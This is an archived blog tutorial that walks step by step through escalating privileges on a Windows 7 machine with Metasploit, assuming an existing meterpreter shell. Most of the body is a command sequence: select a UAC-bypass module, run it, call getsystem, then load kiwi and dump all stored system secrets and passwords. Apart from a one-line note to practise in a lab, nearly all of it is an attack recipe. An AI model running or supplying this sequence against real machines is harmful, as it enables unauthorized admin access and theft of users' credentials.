# Privilege Escalation on a windows_7 machine…

- **Source URL:** https://medium.com/@mazharshadab292/privilege-escalation-on-a-windows-7-machine-135747fa1deb?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230601145358/https://medium.com/@mazharshadab292/privilege-escalation-on-a-windows-7-machine-135747fa1deb
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2862 (id 2862)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Privilege Escalation on a windows\_7 machine…

--

In the previous article I have demonstrated you how to exploit Window Local machine…I have promised you to demonstrate you post exploitation on windows machine…I will demonstrate you how to do privilege escalation on windows machine….

# Privilege Escalation

In short Privilege, Escalation is a method of gaining unauthorized access as an admin on a victim’s computer…

Common type of privilege escalation are as follows-:

1. Credential exploitation
2. Vulnerabilities and exploits
3. Misconfigurations
4. Malware
5. Social engineering

# Exploitation

If you don’t know how to get meterpreter shell of victim machine checkout my previous article [how to get meterpreter shell](/@mazharshadab292/hacking-windows7-82d570a61c8c) of target machine…

After getting meterpreter shell…

After getting a session of victim machine background the session of victim machine…Command is…

bg


Now search for the payload in **metaspoilt** framework..The command is…

search uac


use 5


To find the session type the command

sessions


Now set the session to 1 for this the command is…

set session 1


Now set the target…

set target 0


Now type exploit in the terminal to exploit

exploit


getsystem


Now to see all the passwords of the system load kiwi framework…command is…

load kiwi


after loading of kiwi simply type the command to see all the password…

lsa\_dump\_secrets


Successfully I have done the privilege escalation and dumped all the passwords…

# Note

**Hacking is illegal…practice this is your lab environment..**

# Conclusion

In this short article, I have tried to demonstrate to you how to privilege escalate the window machine using metasploit framework and kiwi framework…

# FOLLOW FOR MORE CONTENTS!!!

**Thank you for Reading!!**

`author: Shadab Mazhar`
